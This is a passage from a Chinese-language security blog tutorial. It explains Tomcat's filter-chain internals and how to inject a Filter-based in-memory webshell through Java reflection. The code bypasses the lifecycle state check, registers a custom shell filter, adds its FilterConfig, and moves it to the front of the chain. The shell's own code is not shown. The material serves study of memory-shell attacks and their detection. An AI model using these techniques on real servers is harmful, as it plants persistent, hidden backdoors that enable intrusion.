<p><code>ServletContext </code>提供了<code>addFilter</code>方法，三个重载方法，分别接收字符串类型的 filterName 以及 Filter 对象/className 字符串/Filter 子类的 Class 对象，提供不同场景下添加 filter 的功能，这些方法均返回 <code>FilterRegistration.Dynamic</code> 实际上就是 FilterRegistration 对象，三种重载方法实际上都是调用<code>org.apache.catalina.core.ApplicationContext#addFilter(java.lang.String, java.lang.String, javax.servlet.Filter)</code>方法</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417134410833.png" alt="image-20230417134410833"  />
</p>
<p>这个方法创建了一个 FilterDef 对象，将 filterName、filterClass、filter 对象初始化进去，使用 StandardContext 的 <code>addFilterDef</code> 方法将创建的 FilterDef 储存在了 StandardContext 中的一个 Hashmap filterDefs 中，然后 new 了一个 ApplicationFilterRegistration 对象并且返回。</p>
<p>但是这个方法添加自定义Filter有两个问题：</p>
<p>1、并且<code>context.getState()</code>在运行时返回的state已经是<code>LifecycleState.STARTED</code>表示程序在运行中，因此如果直接添加的话，程序会直接抛出错误：<code>applicationContext.addFilter.ise</code>.</p>
<p>2、Filter内存马的传递是通过<code>FilterChain</code>，<code>addFilter</code>方法并没有将添加的Filter放到FilterChain链中，因此单纯调用这个方法并不会实现自定义的Filter注册。</p>
<h6 id="问题一">问题一<a hidden class="anchor" aria-hidden="true" href="#问题一">#</a></h6>
<p>对于问题一，有两种解决方案</p>
<p>方法一：</p>
<ul>
<li>我们直接不考虑使用<code>org.apache.catalina.core.ApplicationContext#addFilter()</code>这个方法，因为实际上该方法是通过<code>standardContext.addFilterDef()</code>来实现添加filterDef,因此我们通过反射构造<code>filterDef</code>，然后封装为一个<code>ApplicationFilterRegistration</code>对象即可。</li>
<li>实现方法和之前tomcat内存马学到的差不多，就不再赘述。</li>
</ul>
<p>方法二：</p>
<ul>
<li>
<p>我们通过反射修改<code>context</code>字段的<code>state</code>，在添加filter前，通过反射设置成<code>LifecycleState.STARTING_PREP</code>，在其顺利添加完成后，再把其恢复成<code>LifecycleState.STARTE</code>，这里必须要恢复，要不然会造成服务不可用。</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#007f7f">//修改状态，要不然调用addFilter方法没有效果
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Field</span> stateField = org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">catalina</span>.<span style="color:#007f7f">util</span>.<span style="color:#007f7f">LifecycleBase</span>.<span style="color:#007f7f">class</span>
</span></span><span style="display:flex;"><span>        .<span style="color:#007f7f">getDeclaredField</span>(<span style="color:#0ff;font-weight:bold">&#34;state&#34;</span>);
</span></span><span style="display:flex;"><span>stateField.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>stateField.<span style="color:#007f7f">set</span>(standardContext, org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">catalina</span>.<span style="color:#007f7f">LifecycleState</span>.<span style="color:#007f7f">STARTING_PREP</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>xxxxxxx 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// 恢复状态，使服务正常使用
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">if</span>(stateField != <span style="color:#fff;font-weight:bold">null</span>){
</span></span><span style="display:flex;"><span>    stateField.<span style="color:#007f7f">set</span>(standardContext,org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">catalina</span>.<span style="color:#007f7f">LifecycleState</span>.<span style="color:#007f7f">STARTED</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
<h6 id="问题二">问题二<a hidden class="anchor" aria-hidden="true" href="#问题二">#</a></h6>
<p>在实际执行栈中，可以看到，实际filter的创建是在<code>org.apache.catalina.core.StandardWrapperValve#invoke</code>执行<code>ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</code>的地方。</p>
<p>在<code>createFilterchain</code>方法中先通过<code>wrapper.getParent()</code>获得当前的<code>StandardContext</code>，然后从context中获取<code>FilterMaps</code></p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415162211826.png" alt="image-20230415162211826"  />
</p>
<p>接着<code>createChain</code>方法会遍历 FilterMaps 中的 FilterMap，如果发现符合当前请求 url 与 FilterMap 中的 urlPattern 相匹配，就会进入 if 判断，调用 findFilterConfig 方法在 filterConfigs 中寻找对应 filterName名称的 FilterConfig，然后如果不为null，就进入 if 判断，将 filterConfig 添加到 filterChain中。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415164106484.png" alt="image-20230415164106484"  />
</p>
<p>上述如果获取到的<code>filterConfig</code>不为null的话，就调用<code>org.apache.catalina.core.ApplicationFilterChain#addFilter</code>方法将当前Filter添加到<code>FilterChain</code>上面。</p>
<p>首先会遍历filters，判断我们的filter是否已经存在（其实就是去重），接下来的 if 判断就是扩容，如果 n 已经等于当前 filters 的长度了就再添加10个容量，最后将我们的filterConfig 添加到 filters中。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415164532159.png" alt="image-20230415164532159"  />
</p>
<p>至此 filterChain 组装完毕。</p>
<p>我们可以看到，<code>createFilterChain</code>方法从<code>standardContext</code>中提取了<code>FilterMaps</code>数组，然后遍历FilterMaps，对每个FilterMap对应的FilterName从<code>standardContext</code>中获取对应的<code>FilterConfig</code>，最后将该filterConfig添加到<code>filterChain</code>中。</p>
<p>因此我们需要在FilterMaps和FilterConfigs中注册封装我们自定义的Filter相关信息的FilterMap和FilterConfig。</p>
<p><strong>注册FilterMap:</strong></p>
<ul>
<li>
<p>我们之前通过<code>org.apache.catalina.core.ApplicationContext#addFilter()</code>方法得到的<code>FilterRegistration</code>对象可以调用<code>org.apache.catalina.core.ApplicationFilterRegistration#addMappingForUrlPatterns</code>方法，实现将filterMap插入到standardContext的filterMaps中。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417141608932.png" alt="image-20230417141608932"  />
</p>
</li>
<li>
<p>因此注册FilterDef和FilterMap的完整操作为：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#007f7f">//修改状态，要不然调用addFilter方法没有效果
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Field</span> stateField = org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">catalina</span>.<span style="color:#007f7f">util</span>.<span style="color:#007f7f">LifecycleBase</span>.<span style="color:#007f7f">class</span>
</span></span><span style="display:flex;"><span>        .<span style="color:#007f7f">getDeclaredField</span>(<span style="color:#0ff;font-weight:bold">&#34;state&#34;</span>);
</span></span><span style="display:flex;"><span>stateField.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>stateField.<span style="color:#007f7f">set</span>(standardContext, org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">catalina</span>.<span style="color:#007f7f">LifecycleState</span>.<span style="color:#007f7f">STARTING_PREP</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">//创建一个自定义的Filter马
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>Filter filter = <span style="color:#fff;font-weight:bold">new</span> TomcatShellInject();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// 调用addFilter 方法添加
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>javax.<span style="color:#007f7f">servlet</span>.<span style="color:#007f7f">FilterRegistration</span>.<span style="color:#007f7f">Dynamic</span> filterRegistration = servletContext.<span style="color:#007f7f">addFilter</span>(FILTER_NAME,filter);
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// 进行一些简单的设置
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>filterRegistration.<span style="color:#007f7f">setInitParameter</span>(<span style="color:#0ff;font-weight:bold">&#34;encoding&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;utf-8&#34;</span>);
</span></span><span style="display:flex;"><span>filterRegistration.<span style="color:#007f7f">setAsyncSupported</span>(<span style="color:#fff;font-weight:bold">false</span>);
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// 设置基本的url pattern, 并且注册filterMap
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>filterRegistration.<span style="color:#007f7f">addMappingForUrlPatterns</span>(java.<span style="color:#007f7f">util</span>.<span style="color:#007f7f">EnumSet</span>.<span style="color:#007f7f">of</span>(javax.<span style="color:#007f7f">servlet</span>.<span style="color:#007f7f">DispatcherType</span>.<span style="color:#007f7f">REQUEST</span>),<span style="color:#fff;font-weight:bold">false</span>,<span style="color:#fff;font-weight:bold">new</span> String[]{FILTER_URL_PATTERN});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// 恢复状态，使服务正常使用
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">if</span>(stateField != <span style="color:#fff;font-weight:bold">null</span>){
</span></span><span style="display:flex;"><span>    stateField.<span style="color:#007f7f">set</span>(standardContext,org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">catalina</span>.<span style="color:#007f7f">LifecycleState</span>.<span style="color:#007f7f">STARTED</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
<p><strong>注册FilterConfig:</strong></p>
<p>第一种方法：</p>
<p>我们可以通过反射获得<code>StandardContext</code>对象的<code>filterConfigs</code>属性，然后实例化封装一个FilterConfig对象，然后直接将其添加到filterConfigs中。</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">//获得filterconfigs
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>Field Configs = standardContext.<span style="color:#007f7f">getClass</span>().<span style="color:#007f7f">getDeclaredField</span>(<span style="color:#0ff;font-weight:bold">&#34;filterConfigs&#34;</span>);
</span></span><span style="display:flex;"><span>Configs.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>Map filterConfigs = (Map) Configs.<span style="color:#007f7f">get</span>(standardContext);
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// 实例化一个ApplicationFilterConfig对象
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>Constructor constructor = ApplicationFilterConfig.<span style="color:#007f7f">class</span>.<span style="color:#007f7f">getDeclaredConstructor</span>(Context.<span style="color:#007f7f">class</span>,FilterDef.<span style="color:#007f7f">class</span>);
</span></span><span style="display:flex;"><span>constructor.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.<span style="color:#007f7f">newInstance</span>(standardContext,filterDef);
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// filterConfig的Map是一个HashMap&lt;String, ApplicationFilterConfig&gt;类型的，直接压入就可以
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>filterConfigs.<span style="color:#007f7f">put</span>(name,filterConfig);
</span></span></code></pre></td></tr></table>
</div>
</div><p>第二种方法：</p>
<p>在<code>StandardContext</code>中的方法<code>filterStart实现</code>了根据<code>filterDefs</code>生成<code>filterConfigs</code>。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417143223620.png" alt="image-20230417143223620"  />
</p>
<p>因此我们通过反射直接执行<code>filterStart</code>方法就可以实现注册FilterConfig</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#007f7f">// 设置filter之后调用 filterstart 来启动我们的 filter
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Method</span> filterStartMethod = StandardContext.<span style="color:#007f7f">class</span>.<span style="color:#007f7f">getDeclaredMethod</span>(<span style="color:#0ff;font-weight:bold">&#34;filterStart&#34;</span>);
</span></span><span style="display:flex;"><span>filterStartMethod.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>filterStartMethod.<span style="color:#007f7f">invoke</span>(standardContext,<span style="color:#fff;font-weight:bold">null</span>);
</span></span></code></pre></td></tr></table>
</div>
</div><h6 id="自定义filter优先">自定义filter优先<a hidden class="anchor" aria-hidden="true" href="#自定义filter优先">#</a></h6>
<p>回看<code>org.apache.catalina.core.ApplicationFilterFactory#createFilterChain</code>的代码</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#007f7f">// Add the relevant path-mapped filters to this filter chain
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">for</span> (FilterMap filterMap : filterMaps) {
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (!matchDispatcher(filterMap, dispatcher)) {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">continue</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (!matchFiltersURL(filterMap, requestPath)) {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">continue</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
</span></span><span style="display:flex;"><span>            context.<span style="color:#007f7f">findFilterConfig</span>(filterMap.<span style="color:#007f7f">getFilterName</span>());
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (filterConfig == <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// FIXME - log configuration problem
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">continue</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    filterChain.<span style="color:#007f7f">addFilter</span>(filterConfig);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>创建的顺序是根据filterMaps的顺序来的，那么我们就有必要去修改我们添加的filter顺序到第一位了，我们只需要修改我们注册的filterMap在filterMaps中是第一个就可以了。</p>
<p>代码如下：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
